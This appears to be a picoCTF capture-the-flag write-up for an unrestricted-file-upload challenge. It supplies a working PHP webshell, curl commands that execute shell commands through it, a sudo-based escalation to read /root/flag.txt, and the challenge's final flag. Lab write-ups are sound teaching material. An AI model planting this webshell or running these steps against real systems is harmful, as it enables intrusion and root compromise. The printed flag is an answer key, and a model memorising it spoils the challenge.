## 🧠 picoCTF - Detailed Writeups by [Z4B0](https://www.linkedin.com/in/mahamud-abdirahman-151493375/)

### 🖼️ n0s4n1ty 1 - Unrestricted File Upload & Privilege Escalation

**Objective:** Exploit a vulnerable file-upload feature to upload a webshell, gain code execution, and escalate privileges to read `/root/flag.txt`.

**Target URL:** `http://standard-pizzas.picoctf.net:56931`

**Tools & Resources:**

- Browser or `curl` for uploading files
- Custom PHP webshell
- Linux command-line for interacting via webshell

**Walkthrough:**

1. **Identify File Upload**

   - Navigate to the web page and locate "Upload Profile Picture" form.
   - Test with a `.php` file to see if uploads are restricted by extension.

2. **Craft & Upload Webshell**

   - Create `shell1.php` with the following code:
     ```php
     <?php
       if (isset($_REQUEST['cmd'])) {
         echo "<pre>";
         system($_REQUEST['cmd']);
         echo "</pre>";
       }
     ?>
     ```
   - Upload via the form. Ensure the file is saved under `/uploads/shell1.php`.

3. **Verify Execution**

   - Access it in browser or via `curl`:
     ```bash
     curl "http://standard-pizzas.picoctf.net:56931/uploads/shell1.php?cmd=pwd"
     ```
   - Output: `/var/www/html/uploads`

4. **Check Sudo Privileges**

   - In the webshell, run:
     ```bash
     sudo -l
     ```
   - Revealed:
     ```text
     (ALL) NOPASSWD: ALL
     ```
   - This means the webserver user `www-data` can run any command as root without a password.

5. **List & Read the Flag**
   - List root directory:
     ```bash
     sudo ls /root
     ```
   - Read the flag:
     ```bash
     sudo cat /root/flag.txt
     ```

**Final Flag:**

```
picoCTF{wh47_c4n_u_d0_wPHP_8ca28f94}
```

---
